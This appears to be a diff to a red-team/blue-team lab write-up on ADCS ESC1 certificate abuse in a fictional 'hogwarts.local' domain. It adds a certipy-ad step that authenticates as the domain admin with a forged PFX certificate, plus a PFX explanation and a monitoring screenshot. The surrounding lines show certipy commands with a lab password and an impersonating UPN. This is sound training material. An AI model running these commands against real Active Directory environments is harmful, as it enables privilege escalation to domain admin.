@@ -115,7 +115,7 @@ else
 
 ## Red Team Activity
 HOGWARTS\harry.potter is a user with lowest privilege. It is a just a member of Domain Users. <br>
-HOGWARTS\severus.snape is a domain admin. <br>
+HOGWARTS\severus.snape is a domain admin user. <br>
 ### Step1-Find vulnerable Certificates
 ```console
 # certipy-ad find -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip "192.168.0.111"  -enabled -vulnerable -debug
@@ -126,7 +126,7 @@ HOGWARTS\severus.snape is a domain admin. <br>
 
 <img src="https://github.com/user-attachments/assets/c7572d8e-f948-4302-baa3-849486559f95">
 
-### Step2-Request a Certificated Issued to Domain Admin
+### Step2-Request a Certificated Issued to Domain Admin User
 
 ```console
 # certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'ESC1_Template' -upn 'severus.snape@hogwarts.local' -target CERT01.hogwarts.local -debug
@@ -137,10 +137,16 @@ HOGWARTS\severus.snape is a domain admin. <br>
 <b>-target</b>     : DNS name of the CA. <br>
 
 <img src="https://github.com/user-attachments/assets/50137654-442c-44f1-b482-6353bd56671a">
-
+</br>
 > [!NOTE]  
-> Highlights information that users should take into account, even when skimming.
+> A PFX file is a Personal Information Exchange file used for the storage and transfer of cryptographic information, most commonly a certificate. It generally includes a certificate, possibly with its public key, and its corresponding private key, possibly with a certificate chain. These are all basically used for communications—SSL/TLS for websites or digital signatures.
 
+### Step3-Authenticate as a Domain Admin User
+
+```console
+# certipy-ad auth -pfx severus.snape.pfx -dc-ip 192.168.0.111
+```
+<img src="https://github.com/user-attachments/assets/8b307664-d079-40b6-bde9-d0dcaf60ee60">
 
 
 ## Blue Team Activity
@@ -166,6 +172,8 @@ certsrv.msc -> Right Click to CA -> Properties -> Auditing -> Select All except 
 #### Monitoring Step2 of Red Team Activity
 <img src="https://github.com/user-attachments/assets/d00d79ce-b84b-4acb-9150-70d8d361ebee">
 
+#### Monitoring Step3 of Red Team Activity
+<img src="https://github.com/user-attachments/assets/6714dab1-5164-4010-981b-b4d5050ea459">
 
 
 ## Mitigations and Best Practices
